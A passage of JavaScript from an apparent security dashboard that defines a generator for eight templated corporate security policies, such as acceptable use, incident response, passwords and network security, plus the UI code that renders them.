            <div class="section-title">&#x27E6; DETECTION RULES ACROSS PLATFORMS &#x27E7;</div>
            ${rulesHtml}
        </div>
    `;

    el.scrollIntoView({ behavior: 'smooth', block: 'start' });
}


// ═══════════════════════════════════════════════════════════════════════════
// 6. SECURITY POLICY GENERATOR
// ═══════════════════════════════════════════════════════════════════════════

const _policyTemplates = {
    'Acceptable Use Policy': {
        description: 'Defines acceptable use of organization IT resources including hardware, software, network, and data.',
        generate: (company) => `${company.toUpperCase()} - ACCEPTABLE USE POLICY
${'='.repeat(60)}
Document ID: AUP-${new Date().getFullYear()}-001
Version: 2.0
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: INTERNAL
${'='.repeat(60)}

1. PURPOSE
This Acceptable Use Policy (AUP) establishes the rules governing the use of ${company} information technology resources. All employees, contractors, consultants, and third parties granted access to ${company} IT systems must comply with this policy.

2. SCOPE
This policy applies to all ${company} IT resources including but not limited to:
- Corporate workstations, laptops, and mobile devices
- Network infrastructure (wired and wireless)
- Email and messaging systems
- Cloud services and SaaS applications
- VPN and remote access systems
- Printers, scanners, and peripherals
- Software licenses and subscriptions

3. GENERAL USE AND OWNERSHIP
3.1 All IT resources provided by ${company} remain the property of ${company}.
3.2 Users have no expectation of privacy when using company resources.
3.3 ${company} reserves the right to monitor all activity on company systems.
3.4 Personal use of company resources is permitted on a limited basis provided it does not interfere with work duties, consume excessive resources, or violate any other policy.

4. SECURITY REQUIREMENTS
4.1 All systems must have endpoint protection software installed and active.
4.2 Operating systems and applications must be kept up to date with security patches.
4.3 Automatic screen lock must be enabled after 5 minutes of inactivity.
4.4 Multi-factor authentication (MFA) must be used for all remote access and privileged accounts.
4.5 Removable media (USB drives, external hard drives) must be encrypted.
4.6 Users must not disable or circumvent security controls.

5. PROHIBITED ACTIVITIES
The following activities are strictly prohibited:
5.1 Unauthorized access to systems, data, or networks
5.2 Installation of unauthorized software or hardware
5.3 Sharing login credentials with any person
5.4 Connecting unauthorized devices to the corporate network
5.5 Downloading or distributing pirated software or media
5.6 Accessing, storing, or transmitting illegal, offensive, or inappropriate material
5.7 Using company resources for personal commercial activities
5.8 Attempting to bypass security controls or monitoring systems
5.9 Cryptocurrency mining on company infrastructure
5.10 Using company email for mass solicitation or spam

6. EMAIL AND COMMUNICATION
6.1 Company email is for business use; limited personal use is acceptable.
6.2 Users must not open suspicious attachments or click on unverified links.
6.3 Confidential information must not be sent via unencrypted email.
6.4 Auto-forwarding of company email to external addresses is prohibited.
6.5 Users must report phishing attempts to the security team immediately.

7. REMOTE WORK
7.1 Remote access must be conducted through approved VPN solutions only.
7.2 Company data must not be stored on personal devices without IT approval.
7.3 Home networks used for remote work should use WPA3 encryption.
7.4 Physical security of company devices must be maintained at all times.

8. DATA HANDLING
8.1 Data must be classified and handled according to the Data Classification Policy.
8.2 Confidential data must not be stored on unencrypted removable media.
8.3 Cloud storage of company data is limited to approved services only.
8.4 Data must be disposed of securely when no longer needed.

9. INCIDENT REPORTING
9.1 All security incidents must be reported to the Security Operations Center within 1 hour.
9.2 Lost or stolen devices must be reported immediately.
9.3 Suspected malware infections must be reported without attempting remediation.
9.4 Contact: security@${company.toLowerCase().replace(/\s+/g,'')}.com | SOC Hotline: ext. 5555

10. ENFORCEMENT
Violations of this policy may result in disciplinary action up to and including termination of employment and/or legal action. ${company} may also revoke system access privileges at any time.

11. REVIEW
This policy will be reviewed annually and updated as necessary. All employees must acknowledge receipt and understanding of this policy annually.

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'Incident Response Policy': {
        description: 'Establishes the organizational incident response framework including roles, procedures, and escalation paths.',
        generate: (company) => `${company.toUpperCase()} - INCIDENT RESPONSE POLICY
${'='.repeat(60)}
Document ID: IRP-${new Date().getFullYear()}-001
Version: 3.0
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: CONFIDENTIAL
${'='.repeat(60)}

1. PURPOSE
This policy establishes ${company}'s Computer Security Incident Response Team (CSIRT) procedures for detecting, responding to, and recovering from cybersecurity incidents. The policy aligns with NIST SP 800-61 Rev. 2 and ISO 27035.

2. SCOPE
This policy covers all information security incidents affecting ${company} systems, data, employees, and third-party partners with access to company resources.

3. DEFINITIONS
- Security Event: Any observable occurrence in a system or network.
- Security Incident: A violation or imminent threat of violation of security policies, acceptable use policies, or standard security practices.
- Data Breach: Unauthorized access to or disclosure of sensitive/regulated data.
- Major Incident: An incident requiring activation of the full CSIRT and executive notification.

4. INCIDENT CLASSIFICATION

  Severity 1 (Critical): Active data breach, ransomware, APT compromise, destruction of systems
  - Response Time: Immediate (within 15 minutes)
  - Notification: CISO, CTO, CEO, Legal, external DFIR if needed

  Severity 2 (High): Confirmed malware, unauthorized access, insider threat, phishing with credential compromise
  - Response Time: Within 1 hour
  - Notification: CISO, SOC Manager, affected system owners

  Severity 3 (Medium): Suspicious activity, policy violations, unsuccessful attacks with IOCs
  - Response Time: Within 4 hours
  - Notification: SOC Manager, system owners

  Severity 4 (Low): Informational events, vulnerability disclosures, minor policy violations
  - Response Time: Within 24 hours
  - Notification: SOC analysts

5. INCIDENT RESPONSE PHASES

  5.1 PREPARATION
  - Maintain incident response toolkit and forensic workstations
  - Conduct quarterly tabletop exercises and annual full-scale simulations
  - Maintain up-to-date contact lists for CSIRT members and external partners
  - Ensure logging and monitoring covers all critical assets
  - Maintain relationships with law enforcement and ISACs
  - Review and update playbooks quarterly

  5.2 DETECTION AND ANALYSIS
  - Monitor SIEM alerts, EDR detections, and threat intelligence feeds 24/7
  - Validate alerts and determine if event constitutes an incident
  - Classify incident severity and scope
  - Document initial findings in incident tracking system
  - Collect and preserve volatile evidence
  - Identify affected systems, accounts, and data

  5.3 CONTAINMENT
  Short-term: Isolate affected systems, disable compromised accounts, block malicious IPs/domains
  Long-term: Apply patches, rebuild systems, reset credentials, implement additional monitoring

  5.4 ERADICATION
  - Remove malware and attacker persistence mechanisms
  - Close attack vectors (patch vulnerabilities, fix misconfigurations)
  - Verify removal through scanning and monitoring
  - Update detection rules based on incident IOCs

  5.5 RECOVERY
  - Restore systems from clean backups
  - Gradually return systems to production with enhanced monitoring
  - Verify system integrity before full restoration
  - Monitor recovered systems for 30 days post-recovery

  5.6 POST-INCIDENT REVIEW
  - Conduct lessons learned meeting within 5 business days
  - Document root cause analysis
  - Update policies, procedures, and detection rules
  - Provide metrics to executive leadership

6. CSIRT ROLES AND RESPONSIBILITIES
  - Incident Commander: Leads response, makes containment decisions
  - SOC Lead: Coordinates detection and initial triage
  - Forensic Analyst: Evidence collection and analysis
  - Threat Intelligence Analyst: IOC analysis and threat actor attribution
  - Communications Lead: Internal/external communications
  - Legal Counsel: Regulatory compliance and notification requirements
  - Executive Sponsor: Resource allocation and business decisions

7. COMMUNICATION PLAN
  7.1 Internal: Use encrypted channels (Signal, encrypted email) for incident communications
  7.2 External: All external communications must be approved by Legal and Communications Lead
  7.3 Regulatory: Data breach notifications per GDPR (72h), state laws, and contractual obligations
  7.4 Law Enforcement: Engage FBI/IC3 for significant incidents; preserve evidence chain of custody

8. EVIDENCE HANDLING
  8.1 Follow chain of custody procedures for all evidence
  8.2 Create forensic images before analysis (never analyze original media)
  8.3 Use write-blockers for physical media acquisition
  8.4 Document all actions with timestamps in incident log
  8.5 Retain incident evidence for minimum 7 years

9. THIRD-PARTY COORDINATION
  9.1 Notify affected third parties per contractual obligations
  9.2 Engage external DFIR firm if internal capabilities are insufficient
  9.3 Coordinate with cyber insurance provider for covered incidents
  9.4 Share IOCs with ISACs and trusted partners

10. METRICS AND REPORTING
  - Mean Time to Detect (MTTD)
  - Mean Time to Respond (MTTR)
  - Mean Time to Contain (MTTC)
  - Number of incidents by severity per quarter
  - False positive rate
  - Incidents per attack vector

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'Password Policy': {
        description: 'Defines password requirements, rotation schedules, and authentication standards.',
        generate: (company) => `${company.toUpperCase()} - PASSWORD AND AUTHENTICATION POLICY
${'='.repeat(60)}
Document ID: PWD-${new Date().getFullYear()}-001
Version: 2.5
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: INTERNAL
${'='.repeat(60)}

1. PURPOSE
This policy establishes password and authentication requirements to protect ${company} systems and data from unauthorized access. Aligned with NIST SP 800-63B Digital Identity Guidelines.

2. SCOPE
All user accounts, service accounts, administrative accounts, and third-party accounts accessing ${company} systems.

3. PASSWORD REQUIREMENTS

  3.1 Standard User Accounts
  - Minimum length: 14 characters
  - Must contain: uppercase, lowercase, numbers, and special characters
  - Must not contain: username, company name, or common dictionary words
  - Must not reuse any of the last 24 passwords
  - Maximum age: 90 days (365 days if MFA is enforced)
  - Account lockout: After 5 failed attempts for 30 minutes

  3.2 Privileged/Admin Accounts
  - Minimum length: 20 characters
  - Must use a password manager to generate and store
  - Maximum age: 60 days
  - Must use hardware MFA token (FIDO2/WebAuthn)
  - Account lockout: After 3 failed attempts for 60 minutes
  - Session timeout: 15 minutes of inactivity

  3.3 Service Accounts
  - Minimum length: 25 characters (randomly generated)
  - Must be stored in approved secrets management system (HashiCorp Vault, Azure Key Vault, AWS Secrets Manager)
  - Rotation: Every 90 days minimum, automated where possible
  - Must not be used interactively
  - Must have minimal required permissions (least privilege)

  3.4 API Keys and Tokens
  - Must be stored in secrets management system
  - Must have defined expiration (maximum 1 year)
  - Must be scoped to minimum required permissions
  - Must be rotated immediately if exposure is suspected

4. MULTI-FACTOR AUTHENTICATION (MFA)

  4.1 MFA is REQUIRED for:
  - All remote access (VPN, web applications)
  - All privileged account access
  - Cloud service console access
  - Email access from external networks
  - Financial system access
  - Any system processing PII, PHI, or PCI data

  4.2 Approved MFA Methods (in order of preference):
  1. FIDO2/WebAuthn hardware security keys (YubiKey, Titan Key)
  2. Authenticator apps (Microsoft Authenticator, Google Authenticator)
  3. Push notifications (with number matching)
  4. SMS/Voice (only as backup - not recommended as primary)

  4.3 MFA Bypass: Requires CISO approval with documented business justification and compensating controls.

5. PASSWORD STORAGE AND TRANSMISSION
  5.1 Passwords must be hashed using bcrypt, scrypt, or Argon2id (minimum 12 rounds)
  5.2 Passwords must never be stored in plaintext, scripts, or code repositories
  5.3 Passwords must only be transmitted over encrypted channels (TLS 1.2+)
  5.4 Password managers are required for all employees (approved: 1Password, Bitwarden Enterprise)

6. PROHIBITED PRACTICES
  - Writing passwords on paper or sticky notes
  - Sharing passwords via email, chat, or phone
  - Storing passwords in browsers without master password
  - Using the same password across multiple systems
  - Using personal passwords for business accounts
  - Hardcoding credentials in source code

7. BREACH RESPONSE
  - If password compromise is suspected, change immediately and report to SOC
  - If a credential database is breached, force reset for all affected accounts within 24 hours
  - Monitor for credential stuffing attacks using compromised credentials

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'Data Classification Policy': {
        description: 'Defines data classification levels, handling requirements, and access controls for each level.',
        generate: (company) => `${company.toUpperCase()} - DATA CLASSIFICATION POLICY
${'='.repeat(60)}
Document ID: DCP-${new Date().getFullYear()}-001
Version: 2.0
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: INTERNAL
${'='.repeat(60)}

1. PURPOSE
This policy establishes a framework for classifying ${company} data based on sensitivity and business impact to ensure appropriate protection controls are applied.

2. SCOPE
All data created, collected, processed, stored, or transmitted by ${company} or on behalf of ${company}, in any format (digital, physical, verbal).

3. CLASSIFICATION LEVELS

  LEVEL 1: PUBLIC
  - Definition: Information approved for public release
  - Examples: Marketing materials, press releases, public website content, job postings
  - Handling: No special handling required
  - Access: Unrestricted
  - Encryption: Not required
  - Disposal: Standard deletion

  LEVEL 2: INTERNAL
  - Definition: Information intended for internal use that would not cause significant harm if disclosed
  - Examples: Internal policies, org charts, internal communications, training materials
  - Handling: Do not share externally without approval
  - Access: All ${company} employees
  - Encryption: Required for external transmission
  - Disposal: Secure deletion (overwrite or shred)

  LEVEL 3: CONFIDENTIAL
  - Definition: Sensitive business information that could cause material damage if disclosed
  - Examples: Financial reports, strategic plans, source code, customer lists, contracts, employee records
  - Handling: Need-to-know basis, encrypted storage and transmission
  - Access: Authorized personnel only, access logged
  - Encryption: Required at rest and in transit (AES-256, TLS 1.2+)
  - Disposal: Cryptographic erasure or physical destruction
  - Labeling: Must be clearly marked "CONFIDENTIAL"

  LEVEL 4: RESTRICTED
  - Definition: Highly sensitive data subject to regulatory requirements or whose compromise would cause severe harm
  - Examples: PII, PHI, PCI data, authentication credentials, encryption keys, trade secrets, M&A data
  - Handling: Strict access controls, MFA required, DLP monitoring
  - Access: Named individuals only, approved by data owner, quarterly review
  - Encryption: Required at rest (AES-256) and in transit (TLS 1.3), with key management
  - Disposal: Cryptographic erasure with certificate of destruction
  - Labeling: Must be clearly marked "RESTRICTED"
  - Additional: Subject to data loss prevention (DLP) controls, cannot be stored on personal devices

4. ROLES AND RESPONSIBILITIES
  - Data Owner: Business unit leader responsible for classification and access decisions
  - Data Custodian: IT team responsible for implementing security controls
  - Data User: Any person accessing data, responsible for handling per classification
  - Data Protection Officer: Oversees compliance with data protection regulations

5. DATA HANDLING MATRIX

  Control          | Public  | Internal | Confidential | Restricted
  -----------------+---------+----------+--------------+-----------
  Encryption Rest  | No      | Optional | Required     | Required
  Encryption Trans | No      | Required | Required     | Required (TLS 1.3)
  Access Control   | None    | Role     | Need-to-know | Named individuals
  MFA Required     | No      | No       | Recommended  | Required
  DLP Monitoring   | No      | No       | Yes          | Yes
  Backup Required  | No      | Yes      | Yes          | Yes (encrypted)
  Audit Logging    | No      | Basic    | Full         | Full + alerts
  Sharing External | Allowed | Approval | NDA required | Prohibited*
  Cloud Storage    | Any     | Approved | Approved+enc | Prohibited*
  Printing         | Allowed | Allowed  | Tracked      | Prohibited*
  Mobile Access    | Allowed | MDM req  | MDM + enc    | Prohibited*

  * Exceptions require CISO approval with documented compensating controls

6. DATA LIFECYCLE
  6.1 Creation: Classify data at point of creation
  6.2 Storage: Apply controls per classification level
  6.3 Usage: Handle per classification requirements
  6.4 Sharing: Follow sharing rules per classification
  6.5 Archival: Maintain classification during retention period
  6.6 Destruction: Securely dispose per classification requirements

7. COMPLIANCE
  - GDPR: Personal data of EU residents (Confidential minimum)
  - HIPAA: Protected Health Information (Restricted)
  - PCI DSS: Cardholder data (Restricted)
  - SOX: Financial reporting data (Confidential minimum)

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'Remote Access Policy': {
        description: 'Governs secure remote access to organizational resources including VPN, cloud access, and BYOD.',
        generate: (company) => `${company.toUpperCase()} - REMOTE ACCESS POLICY
${'='.repeat(60)}
Document ID: RAP-${new Date().getFullYear()}-001
Version: 2.0
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: INTERNAL
${'='.repeat(60)}

1. PURPOSE
This policy defines the requirements for securely accessing ${company} IT resources from remote locations. It ensures that remote connections do not introduce unacceptable risk to the corporate environment.

2. SCOPE
All employees, contractors, and third parties who access ${company} systems remotely, including work-from-home, travel, and mobile access scenarios.

3. APPROVED REMOTE ACCESS METHODS
  3.1 Corporate VPN (Primary)
  - Must use ${company}-approved VPN client
  - Always-on VPN required for company-managed devices
  - Split tunneling is PROHIBITED for accessing corporate resources
  - VPN must use IKEv2/IPsec or WireGuard with AES-256 encryption
  - Session timeout: 12 hours maximum, re-authentication required

  3.2 Zero Trust Network Access (ZTNA)
  - Application-level access through approved ZTNA solution
  - Continuous device posture assessment
  - Per-session authentication and authorization
  - No direct network-level access to corporate LAN

  3.3 Virtual Desktop Infrastructure (VDI)
  - Approved for accessing sensitive applications remotely
  - No local data storage permitted
  - Clipboard and file transfer restrictions enforced
  - Session recording enabled for privileged access

  3.4 Cloud Application Access
  - Direct access via SSO with enforced MFA
  - Conditional access policies based on device compliance and location
  - Session controls: download restrictions for unmanaged devices

4. AUTHENTICATION REQUIREMENTS
  - MFA is MANDATORY for all remote access
  - Minimum authentication factors: password + hardware token or authenticator app
  - Certificate-based authentication for VPN connections
  - Privileged access requires additional step-up authentication

5. DEVICE REQUIREMENTS
  5.1 Company-Managed Devices
  - Must be enrolled in MDM/UEM solution
  - Must have approved endpoint protection active and current
  - Must have full-disk encryption enabled
  - Must have current OS patches (within 7 days of release for critical)
  - Must pass device health attestation before connection

  5.2 Personal Devices (BYOD - if approved)
  - Must meet minimum security requirements (see BYOD Policy)
  - Access limited to approved applications via containerization
  - Company reserves right to remotely wipe company data container
  - Must have screen lock enabled (minimum 6-digit PIN or biometric)

6. NETWORK SECURITY
  6.1 Home networks must use WPA3 or WPA2 encryption (minimum)
  6.2 Default router passwords must be changed
  6.3 Public Wi-Fi: VPN must be active before accessing any company resources
  6.4 IoT devices should be on a separate network segment from work devices
  6.5 Network sharing (Bluetooth, AirDrop) must be disabled when connected to VPN

7. DATA PROTECTION
  7.1 Confidential and Restricted data must not be downloaded to personal devices
  7.2 Local storage of company data requires full-disk encryption
  7.3 Cloud sync of company data limited to approved services only
  7.4 Printing of Confidential/Restricted data from remote locations requires manager approval

8. MONITORING AND COMPLIANCE
  8.1 All remote access sessions are logged and monitored by the SOC
  8.2 ${company} reserves the right to audit remote access compliance
  8.3 Anomalous remote access patterns will trigger investigation
  8.4 Geographic impossibility checks are enforced (e.g., login from two distant locations)

9. INCIDENT REPORTING
  - Report immediately: lost/stolen devices, suspected compromise, unusual access alerts
  - Contact: security@${company.toLowerCase().replace(/\s+/g,'')}.com | Emergency: SOC hotline

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'BYOD Policy': {
        description: 'Defines requirements for using personal devices to access corporate resources.',
        generate: (company) => `${company.toUpperCase()} - BRING YOUR OWN DEVICE (BYOD) POLICY
${'='.repeat(60)}
Document ID: BYOD-${new Date().getFullYear()}-001
Version: 1.5
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: INTERNAL
${'='.repeat(60)}

1. PURPOSE
This policy defines the conditions under which personal devices may be used to access ${company} resources, balancing employee flexibility with security requirements.

2. SCOPE
All personal devices (smartphones, tablets, laptops) used by employees and contractors to access ${company} email, applications, data, or network resources.

3. ELIGIBILITY
  3.1 BYOD participation is voluntary and requires manager and IT approval
  3.2 Eligible roles: All full-time employees and approved contractors
  3.3 Restricted roles: Employees handling Restricted-classified data must use company devices

4. APPROVED DEVICES AND OPERATING SYSTEMS
  - iOS: Current version minus 1 (e.g., iOS 18.x or 17.x)
  - Android: Current version minus 2, with monthly security patches
  - Windows: Windows 11 with current feature update
  - macOS: Current version minus 1
  - Jailbroken, rooted, or modified devices are PROHIBITED

5. ENROLLMENT REQUIREMENTS
  5.1 Device must be registered with ${company} IT department
  5.2 MDM/MAM agent must be installed (Microsoft Intune, VMware Workspace ONE)
  5.3 Company work profile/container must be configured
  5.4 Device must pass compliance check before access is granted

6. SECURITY REQUIREMENTS
  6.1 Screen lock: Minimum 6-digit PIN, pattern, or biometric
  6.2 Auto-lock: Maximum 2 minutes of inactivity
  6.3 Encryption: Full device encryption must be enabled
  6.4 Antivirus: Required on Windows and Android devices
  6.5 OS updates: Must be installed within 14 days of release
  6.6 Remote wipe: Employee must consent to remote wipe of company data container
  6.7 Lost device: Must be reported within 4 hours; remote wipe will be initiated

7. DATA SEPARATION
  7.1 Company data is confined to the managed work container/profile
  7.2 Personal apps cannot access data within the work container
  7.3 Copy/paste between work and personal containers is restricted
  7.4 Company data may not be backed up to personal cloud services
  7.5 Company email attachments cannot be saved outside the work container

8. ACCEPTABLE USE
  8.1 Camera and microphone may be disabled in restricted areas
  8.2 Location services: ${company} will not track personal device location
  8.3 Personal content: ${company} will not access personal apps, photos, or messages
  8.4 Bandwidth: Employees are responsible for their own data plans

9. SUPPORT
  9.1 IT will support the work container/profile and approved business apps
  9.2 IT will NOT support personal apps, hardware issues, or carrier problems
  9.3 If a device is wiped due to policy violation, ${company} is not responsible for personal data loss

10. DEPARTURE/OFFBOARDING
  10.1 Upon separation, the work container will be remotely wiped within 24 hours
  10.2 Employee must present device for verification if requested
  10.3 All company accounts will be deprovisioned
  10.4 MDM profile will be removed

11. PRIVACY STATEMENT
  ${company} respects employee privacy. The MDM solution is configured to:
  - CANNOT see: personal emails, texts, photos, browsing history, personal app data
  - CAN see: device model, OS version, compliance status, installed work apps, work container data
  - CAN do: remotely wipe work container only, enforce security policies on work container

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'Email Security Policy': {
        description: 'Defines email security controls, anti-phishing measures, and acceptable email use.',
        generate: (company) => `${company.toUpperCase()} - EMAIL SECURITY POLICY
${'='.repeat(60)}
Document ID: ESP-${new Date().getFullYear()}-001
Version: 2.0
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: INTERNAL
${'='.repeat(60)}

1. PURPOSE
This policy establishes email security requirements to protect ${company} from phishing, business email compromise (BEC), data leakage, and other email-borne threats.

2. SCOPE
All ${company} email systems, including cloud-hosted email (Microsoft 365, Google Workspace), on-premises Exchange servers, and any third-party email services used for business purposes.

3. EMAIL SECURITY CONTROLS

  3.1 Email Authentication
  - SPF: Strict SPF records with -all (hard fail) for all ${company} domains
  - DKIM: 2048-bit DKIM signatures on all outbound email
  - DMARC: p=reject policy with aggregate and forensic reporting
  - ARC: Authenticated Received Chain for forwarded messages
  - MTA-STS: Enforced TLS for inbound/outbound email transport
  - BIMI: Brand Indicators for Message Identification (recommended)

  3.2 Anti-Phishing Controls
  - Advanced threat protection with sandboxing for attachments
  - URL rewriting and time-of-click verification
  - Impersonation protection for executives and sensitive roles
  - External email banner/tag on all inbound external messages
  - AI-based BEC detection enabled
  - QR code scanning in email bodies and attachments

  3.3 Anti-Malware
  - Real-time scanning of all inbound and outbound attachments
  - Sandboxing/detonation of suspicious attachments
  - Zero-hour auto purge (ZAP) for post-delivery threat detection
  - Block high-risk attachment types: .exe, .scr, .bat, .cmd, .ps1, .vbs, .js, .hta, .wsf, .lnk, .iso, .img, .vhd

  3.4 Data Loss Prevention (DLP)
  - DLP rules for PII, PHI, PCI, and other regulated data
  - Policy tips warning users before sending sensitive content
  - Automatic encryption for emails containing sensitive data
  - Block external forwarding of Confidential/Restricted emails
  - Restrict auto-forwarding rules to external domains

4. USER RESPONSIBILITIES
  4.1 Verify sender identity before acting on financial requests or credential changes
  4.2 Report suspicious emails using the "Report Phishing" button
  4.3 Do not open unexpected attachments, even from known senders
  4.4 Verify unusual requests via a separate communication channel (phone, in-person)
  4.5 Do not use personal email for business communications
  4.6 Do not send Restricted data via email (use approved secure file transfer)

5. EMAIL RETENTION
  5.1 Business email: 7-year retention per regulatory requirements
  5.2 Litigation hold: Indefinite when notified by Legal
  5.3 Deleted items: Recoverable for 30 days, then permanently purged
  5.4 Archive: Automatic archival after 1 year

6. EXECUTIVE PROTECTION
  6.1 C-suite and finance team accounts have enhanced protections:
  - Hardware MFA tokens required
  - Conditional access: approved devices only
  - Enhanced impersonation protection
  - Wire transfer requests require phone verification regardless of sender

7. INCIDENT RESPONSE
  7.1 Phishing Reported: SOC triages within 15 minutes
  7.2 Confirmed Phishing: Auto-purge from all mailboxes within 30 minutes
  7.3 BEC Detected: Immediate account lockdown, password reset, session revocation
  7.4 Data Leak: DLP alert triggers investigation within 1 hour

8. TRAINING
  8.1 All employees: Annual security awareness training with email focus
  8.2 Monthly phishing simulations with targeted training for repeat offenders
  8.3 New hire: Email security module in onboarding (within first week)
  8.4 High-risk roles (finance, HR, executives): Quarterly advanced training

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    },

    'Network Security Policy': {
        description: 'Defines network architecture security requirements, segmentation, monitoring, and access controls.',
        generate: (company) => `${company.toUpperCase()} - NETWORK SECURITY POLICY
${'='.repeat(60)}
Document ID: NSP-${new Date().getFullYear()}-001
Version: 3.0
Effective Date: ${new Date().toISOString().substring(0,10)}
Classification: CONFIDENTIAL
${'='.repeat(60)}

1. PURPOSE
This policy establishes network security requirements to protect ${company} infrastructure, data, and services from unauthorized access, interception, and disruption.

2. SCOPE
All ${company} network infrastructure including LAN, WAN, WLAN, cloud networks, VPN, DMZ, and interconnections with third parties.

3. NETWORK ARCHITECTURE

  3.1 Segmentation Requirements
  - Production, development, and test environments must be on separate network segments
  - PCI cardholder data environment (CDE) must be isolated in its own VLAN
  - Guest Wi-Fi must be completely isolated from corporate network
  - IoT/OT devices must be on dedicated segments with strict ACLs
  - Management/administrative networks must be separate from user networks
  - Zero Trust micro-segmentation required for critical assets

  3.2 DMZ Architecture
  - All internet-facing services must reside in the DMZ
  - No direct connections from internet to internal network
  - DMZ servers must not initiate connections to internal network
  - Web Application Firewall (WAF) required for all web applications
  - Reverse proxy required for all externally accessible services

  3.3 Cloud Network Security
  - Virtual Private Cloud (VPC) with private subnets for workloads
  - Network Security Groups (NSGs) with deny-all default rules
  - VPC Flow Logs enabled and forwarded to SIEM
  - Private endpoints for cloud services (no public endpoints for databases/storage)
  - Cloud-to-on-premises connectivity via dedicated circuit or IPsec VPN

4. FIREWALL MANAGEMENT
  4.1 Default deny (deny all, permit by exception)
  4.2 Rules must have documented business justification and expiration date
  4.3 "Any/Any" rules are PROHIBITED
  4.4 Firewall rules reviewed quarterly; unused rules removed
  4.5 Change management required for all firewall modifications
  4.6 Next-generation firewall (NGFW) with IPS, application control, and SSL inspection
  4.7 Geo-blocking enforced for countries with no business need

5. INTRUSION DETECTION AND PREVENTION
  5.1 IDS/IPS deployed at network perimeter and critical internal segments
  5.2 Signatures updated at least daily
  5.3 Behavioral/anomaly detection enabled
  5.4 Network Detection and Response (NDR) for encrypted traffic analysis
  5.5 All alerts forwarded to SIEM for correlation

6. WIRELESS SECURITY
  6.1 WPA3-Enterprise with 802.1X authentication for corporate WLAN
  6.2 Separate SSIDs for corporate, guest, and IoT
  6.3 Wireless intrusion prevention system (WIPS) deployed
  6.4 Rogue access point detection enabled
  6.5 Corporate WLAN: certificate-based authentication preferred
  6.6 Guest WLAN: captive portal with acceptable use agreement, internet-only access

7. DNS SECURITY
  7.1 Internal DNS resolvers only (no direct external DNS from endpoints)
  7.2 DNS filtering/security service for malware/phishing domain blocking
  7.3 DNSSEC validation enabled
  7.4 DNS query logging forwarded to SIEM
  7.5 DNS over HTTPS (DoH) blocked at network level except for approved resolvers

8. ENCRYPTION IN TRANSIT
  8.1 TLS 1.2 minimum for all services; TLS 1.3 preferred
  8.2 SSL/TLS inspection for outbound HTTPS (with employee notification)
  8.3 Deprecated protocols disabled: SSLv3, TLS 1.0, TLS 1.1
  8.4 Weak cipher suites disabled (RC4, DES, 3DES, NULL)
  8.5 Certificate management: automated renewal, 90-day maximum validity

9. NETWORK MONITORING
  9.1 Full packet capture capability at network perimeter
  9.2 NetFlow/sFlow collection from all network devices
  9.3 Network traffic analysis for anomaly detection
  9.4 Bandwidth monitoring with alerting for unusual patterns
  9.5 All network device logs forwarded to SIEM
  9.6 Network device configuration backup and change monitoring

10. ACCESS CONTROL
  10.1 Network Access Control (NAC) for all wired connections
  10.2 802.1X port-based authentication
  10.3 MAC address filtering as supplementary control (not primary)
  10.4 Unused switch ports disabled
  10.5 DHCP snooping and dynamic ARP inspection enabled
  10.6 Network device management access restricted to management VLAN only
  10.7 SNMPv3 only (v1/v2c disabled); SSH only for device management (no Telnet)

Approved by: Chief Information Security Officer
Review Date: ${new Date(Date.now() + 365*24*60*60*1000).toISOString().substring(0,10)}`
    }
};

function loadPolicyGenerator() {
    const pc = _showPageContent();
    if (_threatDashboardInterval) { clearInterval(_threatDashboardInterval); _threatDashboardInterval = null; }

    const policyButtons = Object.entries(_policyTemplates).map(([name, tpl]) =>
        `<div class="hack-card" onclick="_generatePolicy('${name}')" style="cursor:pointer">
            <div class="card-title" style="font-size:12px">${name}</div>
            <div class="card-desc" style="font-size:10px">${tpl.description}</div>
        </div>`
    ).join('');

    pc.innerHTML = `
        <div style="margin-bottom:24px">
            <div style="display:flex;align-items:center;gap:12px;margin-bottom:8px">
                <h1 style="margin:0;border:none;padding:0">SECURITY POLICY GENERATOR</h1>
                <span class="card-tag" style="position:static">COMPLIANCE</span>
            </div>
            <p style="color:var(--text-secondary);font-size:13px">Generate professional, customized security policy documents. Select a policy type, enter your company name, and export the complete document.</p>
        </div>

        <div class="section-title">&#x27E6; CONFIGURATION &#x27E7;</div>
        <div style="display:flex;gap:8px;align-items:center;margin-bottom:16px">
            <label style="color:var(--text-secondary);font-size:11px;flex-shrink:0">COMPANY NAME:</label>
            <input type="text" id="policy-company" value="Acme Corporation" style="flex:1;max-width:400px;background:var(--bg-primary);border:1px solid var(--border);color:var(--text-primary);padding:8px 14px;font-family:var(--font-mono);font-size:12px;border-radius:4px;outline:none">
        </div>

        <div class="section-title">&#x27E6; SELECT POLICY TYPE &#x27E7;</div>
        <div class="card-grid" style="grid-template-columns:repeat(auto-fill,minmax(250px,1fr))">${policyButtons}</div>

        <div id="policy-output" style="margin-top:16px"></div>
    `;
}

function _generatePolicy(policyName) {
    const tpl = _policyTemplates[policyName];
    if (!tpl) return;

    const company = document.getElementById('policy-company').value.trim() || 'Acme Corporation';
    const policyText = tpl.generate(company);
    const el = document.getElementById('policy-output');

    el.innerHTML = `
        <div class="section-title">&#x27E6; GENERATED POLICY: ${policyName.toUpperCase()} &#x27E7;</div>
        <div style="display:flex;gap:8px;margin-bottom:12px">
            <button class="btn-hack" onclick="_copyToClipboard(document.getElementById('policy-text-content').textContent,this)">COPY TO CLIPBOARD</button>
